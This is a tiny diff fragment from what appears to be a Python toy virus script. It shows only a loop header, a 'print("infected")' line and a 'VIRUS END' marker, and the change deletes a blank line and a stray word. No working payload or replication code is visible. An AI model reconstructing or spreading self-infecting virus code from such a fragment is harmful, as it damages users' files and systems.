@@ -47,5 +47,3 @@ for p in ps:
 print("infected")
 
 #### VIRUS END ####
-
-pee
